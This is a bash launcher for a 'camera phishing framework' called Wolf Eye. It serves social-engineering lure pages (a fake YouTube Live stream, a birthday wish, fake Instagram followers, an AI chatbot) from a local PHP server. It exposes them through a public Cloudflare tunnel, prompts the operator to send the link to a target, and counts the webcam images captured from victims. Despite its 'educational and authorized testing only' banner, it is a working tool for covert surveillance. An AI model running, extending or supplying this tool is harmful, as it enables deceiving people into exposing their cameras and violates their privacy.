#!/bin/bash

# ---------------------------------------------
# WOLF EYE – Camera Phishing Framework
# Rebranded by Nexreaper x Wolf Intelligence
# For educational and authorized testing only.
# ---------------------------------------------

clear
echo -e "\033[31m
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║                         W O L F   E Y E                           ║
║                                                                   ║
║    ██╗    ██╗ ██████╗ ██╗     ███████╗     ███████╗██╗   ██╗███████╗
║    ██║    ██║██╔═══██╗██║     ██╔════╝     ██╔════╝╚██╗ ██╔╝██╔════╝
║    ██║ █╗ ██║██║   ██║██║     █████╗       █████╗   ╚████╔╝ █████╗  
║    ██║███╗██║██║   ██║██║     ██╔══╝       ██╔══╝    ╚██╔╝  ██╔══╝  
║    ╚███╔███╔╝╚██████╔╝███████╗███████╗     ███████╗   ██║   ███████╗
║     ╚══╝╚══╝  ╚═════╝ ╚══════╝╚══════╝     ╚══════╝   ╚═╝   ╚══════╝
║                                                                   ║
║            NEXREAPER x WOLF INTELLIGENCE – Mene                  ║
║                Advanced Camera Phishing Framework                ║
║           Creator: Ahmad Bilal Qureshi & Wolf Intelligence       ║
╚═══════════════════════════════════════════════════════════════════╝
\033[0m"
echo ""
echo -e "\033[33m[•] Loaded modules: PHP, Cloudflared, getMedia\033[0m"
echo -e "\033[36m[•] Ready to capture targets.\033[0m"
echo ""

# ---------- Dependency Check ----------
deps=("php" "curl" "wget" "jq" "cloudflared" "lolcat")
for dep in "${deps[@]}"; do
    if ! command -v $dep &> /dev/null; then
        echo -e "\033[31m[!] Missing: $dep. Installing...\033[0m"
        if [[ "$OSTYPE" == "linux-gnu"* ]]; then
            sudo apt install -y $dep
        elif [[ "$OSTYPE" == "darwin"* ]]; then
            brew install $dep
        elif [[ "$OSTYPE" == "msys" ]]; then
            echo "[!] Windows not supported. Install manually."
        fi
    fi
done

# ---------- Menu ----------
echo -e "\033[34m[+] Select a lure template:\033[0m"
echo "  1. YouTube Live TV"
echo "  2. Birthday Wish"
echo "  3. Secret Message"
echo "  4. Fake Instagram Followers"
echo "  5. AI Chatbot"
read -p "Choice: " choice

case $choice in
    1) template="youtube";;
    2) template="birthday";;
    3) template="secret";;
    4) template="instagram";;
    5) template="chatbot";;
    *) echo "Invalid"; exit;;
esac

# ---------- Start PHP Server ----------
echo -e "\033[32m[+] Starting PHP server on port 8080...\033[0m"
php -S 0.0.0.0:8080 -t ./templates/$template/ > /dev/null 2>&1 &
PHP_PID=$!

# ---------- Cloudflared Tunnel ----------
echo -e "\033[32m[+] Launching Cloudflare tunnel...\033[0m"
cloudflared tunnel --url http://localhost:8080 --logfile cloudflared.log &
sleep 5
TUNNEL_URL=$(grep -o 'https://[a-z0-9]*\.trycloudflare\.com' cloudflared.log | head -1)

if [ -z "$TUNNEL_URL" ]; then
    echo -e "\033[31m[!] Tunnel failed. Check cloudflared.log\033[0m"
    exit
fi

echo -e "\033[36m[+] Share this link with the target:\033[0m"
echo -e "\033[33m$TUNNEL_URL\033[0m"
echo -e "\033[33m[+] Waiting for captures... (Ctrl+C to stop)\033[0m"

# ---------- Capture Loop ----------
mkdir -p captured_imgs
while true; do
    # PHP script writes captures; we just watch the folder
    sleep 2
    count=$(ls captured_imgs/*.jpg 2>/dev/null | wc -l)
    if [ $count -gt 0 ]; then
        echo -e "\033[32m[+] Captured $count images so far\033[0m"
    fi
done

# ---------- Cleanup ----------
trap "kill $PHP_PID; pkill cloudflared; exit" INT
